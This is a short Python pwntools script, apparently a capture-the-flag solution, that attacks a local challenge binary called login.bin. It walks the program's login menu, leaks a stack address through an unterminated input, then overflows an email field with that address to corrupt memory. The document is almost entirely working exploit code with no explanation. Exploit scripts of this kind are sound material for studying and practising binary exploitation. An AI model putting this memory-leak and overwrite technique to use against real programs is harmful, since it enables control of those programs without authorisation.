#!/usr/bin/python3

from pwn import *

def exploit():
    # Write your exploit logic here.
    p = process("./login.bin")
    
    p.recvuntil(b"E): ")
    p.send(b"J\x00"+b"J"*30)
    sleep(0.5)
    p.recvuntil(b"ID: ")
    p.sendline(b"1")
    p.recvuntil(b"allowed")
    p.recvuntil(b"E): ")
    p.sendline(b"L")
    p.recvuntil(b"ID: ")
    p.send(b"D"*32)
    sleep(0.5)
    stack_addr = p.recv()[43:49]+ b"\x00\x00"
    stack_addr = u64(stack_addr)
    stack_addr -= 0x60
    stack_addr = p64(stack_addr)
    
    p.sendline(b"J")
    p.recvuntil(b"ID: ")
    p.sendline(b"aa")
    p.recvuntil(b"password: ")
    p.sendline(b"aa")
    p.recvuntil(b"E): ")
    p.sendline(b"L")
    p.recvuntil(b"ID: ")
    p.sendline(b"aa")
    p.recvuntil(b"password: ")
    p.sendline(b"aa")
    sleep(0.5)
    
    p.recvuntil(b"L): ")
    p.sendline(b"A")
    p.recvuntil(b"new email: ")
    
    p.send(b"a"*23+b"@."+stack_addr[0:6])
    p.recvuntil(b"L): ")
    p.sendline(b"W")
    p.recvuntil(b"L): ")
    p.sendline(b"A")
    print(p.recv())

    
    

if __name__ == "__main__":
    exploit()
